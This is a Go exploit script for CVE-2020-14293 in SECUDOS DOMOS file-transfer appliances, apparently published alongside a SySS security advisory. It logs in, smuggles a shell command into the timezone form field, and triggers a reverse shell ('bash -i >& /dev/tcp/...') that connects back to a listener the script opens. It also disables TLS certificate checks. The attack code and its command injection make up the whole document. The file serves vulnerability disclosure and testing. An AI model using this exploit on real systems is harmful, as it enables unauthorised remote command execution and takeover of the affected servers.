/*
Exploit Title: DOMOS authenticated RCE and privilege escalation
Date: 2020-09-25
Exploit Author: Patrick Hener, SySS GmbH
Vendor Homepage: https://www.secudos.de/
Software Link: https://www.secudos.de/produkte/qiata-file-transfer/varianten
Version: <= DOMOS 5.8
Tested on: DOMOS 5.8
CVE : CVE-2020-14293

This exploit was written by Patrick Hener, SySS GmbH
Advisory: SYSS-2020-025 (https://www.syss.de/fileadmin/dokumente/Publikationen/Advisories/SYSS-2020-025.txt)
*/

package main

import (
	"bytes"
	"crypto/tls"
	"fmt"
	"io"
	"log"
	"mime/multipart"
	"net"
	"net/http"
	"net/http/cookiejar"
	"net/url"
	"os"
	"regexp"
	"strconv"
)

type progress struct {
	bytes uint64
}

func preflight(url string, client *http.Client) *http.Response {
	// Preflight GET for getting session_id
	resp, err := client.Get(url)

	if err != nil {
		fmt.Println("[-] Error in Stage 1 - Preflight request")
		fmt.Println(err)
	}

	return resp
}

func login(uri string, client *http.Client, user string, password string) *http.Response {
	// Login and obtain session
	requestBody := url.Values{}
	requestBody.Set("dcfct", "DCbase.login")
	requestBody.Add("username", user)
	requestBody.Add("password", password)

	resp, err := client.PostForm(uri, requestBody)
	if err != nil {
		fmt.Println("[-] Error in Stage 2 - Login request")
		fmt.Println(err)
	}

	return resp
}

func injectPayload(uri string, client *http.Client, payload string) *http.Response {
	// Inject the payload using Multipart Formdata
	payloadURI := fmt.Sprintf("%s/page/td_timezone", uri)

	var requestBody bytes.Buffer
	multipartWriter := multipart.NewWriter(&requestBody)

	fieldWriter, err := multipartWriter.CreateFormField("dcfct")
	if err != nil {
		fmt.Println(err)
	}

	_, err = fieldWriter.Write([]byte("DCbase.pageinput"))
	if err != nil {
		fmt.Println(err)
	}

	fieldWriter, err = multipartWriter.CreateFormField("dbkey:datetime.clock.timezone")
	if err != nil {
		fmt.Println(err)
	}

	injectionPayload := fmt.Sprintf("Europe/Berlin /etc/localtime; %s; cat", payload)
	_, err = fieldWriter.Write([]byte(injectionPayload))
	if err != nil {
		fmt.Println(err)
	}

	fieldWriter, err = multipartWriter.CreateFormField("submit")
	if err != nil {
		fmt.Println(err)
	}

	_, err = fieldWriter.Write([]byte("Save"))
	if err != nil {
		fmt.Println(err)
	}

	multipartWriter.Close()

	req, err := http.NewRequest("POST", payloadURI, &requestBody)
	if err != nil {
		fmt.Println(err)
	}

	referer := fmt.Sprintf("%s/smenu/td_timezone", uri)
	req.Header.Set("Content-Type", multipartWriter.FormDataContentType())
	req.Header.Set("User-Agent", "Mozilla/5.0 (X11; Linux x86_64; rv:77.0) Gecko/20100101 Firefox/77.0")
	req.Header.Set("Accept-Encoding", "gzip, deflate")
	req.Header.Set("Accept", "text/html,application/xhtml+xml,application/xml;q=0.9,image/webp,*/*;q=0.8")
	req.Header.Set("Connection", "close")
	req.Header.Set("Accept-Language", "en-US,en;q=0.5")
	req.Header.Set("Referer", referer)
	req.Header.Set("Upgrade-Insecure-Requests", "1")

	injectionResponse, err := client.Do(req)
	if err != nil {
		fmt.Println("[-] Error in stage 3 - Injecting Payload")
	}

	return injectionResponse
}

func triggerPayload(uri string, client *http.Client) {
	// Trigger Payload with GET request
	triggerURL := fmt.Sprintf("%s/reconf", uri)
	_, err := client.Get(triggerURL)

	if err != nil {
		fmt.Println("[-] Error in Stage 4 - Triggering response")
		fmt.Println(err)
	}
}

func transferStreams(con net.Conn) {
	c := make(chan progress)

	// Read from Reader and write to Writer until EOF
	copy := func(r io.ReadCloser, w io.WriteCloser) {
		defer func() {
			r.Close()
			w.Close()
		}()
		n, err := io.Copy(w, r)
		if err != nil {
			fmt.Printf("[%s]: ERROR: %s\n", con.RemoteAddr(), err)
		}
		c <- progress{bytes: uint64(n)}
	}

	go copy(con, os.Stdout)
	go copy(os.Stdin, con)

	p := <-c
	fmt.Printf("[*] [%s]: Connection has been closed by remote peer, %d bytes has been received\n", con.RemoteAddr(), p.bytes)
	p = <-c
	fmt.Printf("[*] [%s]: Local peer has been stopped, %d bytes has been sent\n", con.RemoteAddr(), p.bytes)
}

func startServer(addr string) {
	ln, err := net.Listen("tcp", addr)
	if err != nil {
		log.Fatalln(err)
	}
	fmt.Printf("[+] Now listening on %s\n", addr)
	con, err := ln.Accept()
	if err != nil {
		log.Fatalln(err)
	}
	fmt.Printf("[+] [%s]: Connection has been opened. Enjoy your shell, good sir.\n", con.RemoteAddr())
	transferStreams(con)
}

func startListener(lhost string, lport int) {
	// Listen for socket connection
	addr := fmt.Sprintf("%s:%d", lhost, lport)
	fmt.Printf("[*] Starting reverse listener at %s\n", addr)
	startServer(addr)
}

func main() {
	// parse args
	if len(os.Args) < 6 {
		fmt.Printf("usage: %s username[admin] password[admin] lhost[192.168.x.x] lport[4444] url[https://ip:10000]\n", os.Args[0])
		return
	}

	user := os.Args[1]
	password := os.Args[2]
	lhost := os.Args[3]
	lport, err := strconv.Atoi(os.Args[4])
	if err != nil {
		fmt.Println("lport has to be numeric")
	}
	url := os.Args[5]

	// definition payload
	payload := fmt.Sprintf("bash -i >& /dev/tcp/%s/%v 0>&1", lhost, lport)
	fmt.Println(payload)

	// Ignore bad certificates
	http.DefaultTransport.(*http.Transport).TLSClientConfig = &tls.Config{InsecureSkipVerify: true}

	// Init cookiejar and client to use
	cookieJar, _ := cookiejar.New(nil)
	client := &http.Client{
		Jar: cookieJar,
	}

	// Stage 1 - Preflight to obtain session_id
	fmt.Println("[*] sending preflight request to acquire session_id")
	preflightResp := preflight(url, client)
	if preflightResp.Status == "200 OK" {
		fmt.Println("[+] session_id aquired")
	}

	// Stage 2 - Login to aquire valid session
	fmt.Println("[*] sending login request to validate session.")
	loginResponse := login(url, client, user, password)
	buf := new(bytes.Buffer)
	buf.ReadFrom(loginResponse.Body)
	loginResponseString := buf.String()
	hasError, err := regexp.MatchString("\\bError\\b", loginResponseString)
	if err != nil {
		fmt.Println("[-] There were problems reading the response body of the login request.")
	}
	if !hasError {
		fmt.Println("[+] login was successful")

	} else {
		fmt.Println("[-] there was something wrong with the login -> check credentials again")
		return
	}

	// Stage 3 - Inject Payload (have to do it twice to take effect)
	injectionResponse := injectPayload(url, client, payload)
	injectionResponse = injectPayload(url, client, payload)
	if injectionResponse.Status == "200 OK" {
		fmt.Println("[+] successfully injected payload")
	}

	// Stage 4 - Triggering the reverse shell
	fmt.Println("[*] activating settings changes to trigger payload")
	go triggerPayload(url, client)

	// Start reverse listener
	startListener(lhost, lport)
}
